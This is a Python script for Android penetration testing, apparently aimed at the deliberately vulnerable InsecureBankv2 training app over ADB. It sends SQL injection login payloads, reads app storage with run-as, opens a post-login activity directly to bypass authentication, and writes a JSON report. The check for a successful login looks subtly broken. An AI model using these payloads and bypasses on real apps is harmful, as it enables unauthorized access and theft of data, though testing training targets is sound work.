#!/usr/bin/env python3

import subprocess
import json
import os
from datetime import datetime
import argparse
import time

class AndroidPentestFramework:
    def __init__(self):
        self.target_package = "com.android.insecurebankv2"
        self.report_data = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'target_app': self.target_package,
            'vulnerabilities': []
        }

    def check_adb_connection(self):
        """Check if any Android device is connected via ADB"""
        try:
            result = subprocess.run(['adb', 'devices'], capture_output=True, text=True)
            devices = result.stdout.strip().split('\n')[1:]
            connected_devices = [d for d in devices if d and 'device' in d]
            if connected_devices:
                print(f"[+] Found {len(connected_devices)} connected device(s)")
                return True
            else:
                print("[-] No devices connected via ADB")
                return False
        except Exception as e:
            print(f"[-] Error checking ADB connection: {e}")
            return False

    def install_app(self):
        """Install InsecureBankv2 APK"""
        try:
            print("\n[*] Installing InsecureBankv2...")
            result = subprocess.run(
                ['adb', 'install', '-r', 'InsecureBankv2.apk'],
                capture_output=True,
                text=True
            )
            if 'Success' in result.stdout:
                print("[+] Installation successful")
                return True
            else:
                print(f"[-] Installation failed: {result.stderr}")
                return False
        except Exception as e:
            print(f"[-] Installation error: {e}")
            return False

    def analyze_app_permissions(self):
        """Analyze permissions requested by the application"""
        try:
            print("\n[*] Analyzing app permissions...")
            result = subprocess.run(
                ['adb', 'shell', 'dumpsys', 'package', self.target_package],
                capture_output=True,
                text=True
            )
            permissions = []
            dangerous_permissions = []
            
            for line in result.stdout.split('\n'):
                if 'permission' in line:
                    perm = line.strip()
                    permissions.append(perm)
                    if 'dangerous' in perm.lower():
                        dangerous_permissions.append(perm)
            
            print(f"[+] Found {len(permissions)} permissions ({len(dangerous_permissions)} dangerous)")
            self.report_data['vulnerabilities'].append({
                'type': 'permission_analysis',
                'total_permissions': len(permissions),
                'dangerous_permissions': len(dangerous_permissions),
                'findings': permissions
            })
            return permissions
        except Exception as e:
            print(f"[-] Permission analysis error: {e}")
            return []

    def test_sql_injection(self):
        """Test SQL injection vulnerabilities"""
        print("\n[*] Testing SQL injection...")
        payloads = [
            "' OR '1'='1",
            "admin' --",
            "' UNION SELECT '1",
            "' OR 1=1 --"
        ]
        
        for payload in payloads:
            try:
                print(f"\n[*] Trying payload: {payload}")
                cmd = [
                    'adb', 'shell', 'am', 'start', '-n',
                    f'{self.target_package}/.LoginActivity',
                    '--es', 'username', payload,
                    '--es', 'password', payload
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                time.sleep(2)  # Wait for activity to process
                
                # Check if login was successful
                current_activity = subprocess.run(
                    ['adb', 'shell', 'dumpsys', 'window', 'windows', '|', 'grep', 'mCurrentFocus'],
                    capture_output=True,
                    text=True
                )
                
                if 'PostLogin' in current_activity.stdout:
                    print(f"[+] SQL Injection successful with payload: {payload}")
                    self.report_data['vulnerabilities'].append({
                        'type': 'sql_injection',
                        'payload': payload,
                        'status': 'vulnerable'
                    })
                    return True
            except Exception as e:
                print(f"[-] SQL injection test error: {e}")
        
        return False

    def check_data_storage(self):
        """Check for sensitive data in storage"""
        print("\n[*] Analyzing data storage...")
        try:
            # Check shared preferences
            prefs_cmd = [
                'adb', 'shell', 'run-as', self.target_package,
                'cat', '/data/data/com.android.insecurebankv2/shared_prefs/mySharedPreferences.xml'
            ]
            prefs_result = subprocess.run(prefs_cmd, capture_output=True, text=True)
            
            # Check databases
            db_cmd = [
                'adb', 'shell', 'run-as', self.target_package,
                'ls', '/data/data/com.android.insecurebankv2/databases/'
            ]
            db_result = subprocess.run(db_cmd, capture_output=True, text=True)
            
            findings = {
                'shared_prefs': bool(prefs_result.stdout),
                'databases': db_result.stdout.split('\n') if db_result.stdout else []
            }
            
            self.report_data['vulnerabilities'].append({
                'type': 'data_storage',
                'findings': findings
            })
            
            print("[+] Data storage analysis complete")
            return findings
        except Exception as e:
            print(f"[-] Data storage analysis error: {e}")
            return None

    def test_intent_vulnerabilities(self):
        """Test for intent-based vulnerabilities"""
        print("\n[*] Testing intent vulnerabilities...")
        try:
            # Test PostLogin activity direct access
            cmd = [
                'adb', 'shell', 'am', 'start', '-n',
                f'{self.target_package}/.PostLogin',
                '--ez', 'isLoggedIn', 'true'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if 'Error' not in result.stderr:
                print("[+] Found vulnerable activity: PostLogin (direct access possible)")
                self.report_data['vulnerabilities'].append({
                    'type': 'intent_vulnerability',
                    'component': 'PostLogin',
                    'status': 'vulnerable'
                })
                return True
            return False
        except Exception as e:
            print(f"[-] Intent vulnerability test error: {e}")
            return False

    def generate_report(self):
        """Generate JSON report with findings"""
        try:
            report_file = f"android_pentest_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(report_file, 'w') as f:
                json.dump(self.report_data, f, indent=4)
            print(f"\n[+] Report generated: {report_file}")
            return report_file
        except Exception as e:
            print(f"[-] Report generation error: {e}")
            return None

def main():
    parser = argparse.ArgumentParser(description='Android Application Penetration Testing Framework')
    parser.add_argument('--install', action='store_true', help='Install the target application')
    parser.add_argument('--all', action='store_true', help='Run all tests')
    parser.add_argument('--sql', action='store_true', help='Test SQL injection')
    parser.add_argument('--storage', action='store_true', help='Test data storage')
    parser.add_argument('--intents', action='store_true', help='Test intent vulnerabilities')
    parser.add_argument('--permissions', action='store_true', help='Analyze app permissions')
    
    args = parser.parse_args()
    
    framework = AndroidPentestFramework()
    
    if not framework.check_adb_connection():
        print("Please connect an Android device and enable USB debugging")
        return
    
    if args.install or args.all:
        framework.install_app()
    
    if args.permissions or args.all:
        framework.analyze_app_permissions()
    
    if args.sql or args.all:
        framework.test_sql_injection()
    
    if args.storage or args.all:
        framework.check_data_storage()
    
    if args.intents or args.all:
        framework.test_intent_vulnerabilities()
    
    framework.generate_report()

if __name__ == "__main__":
    main()
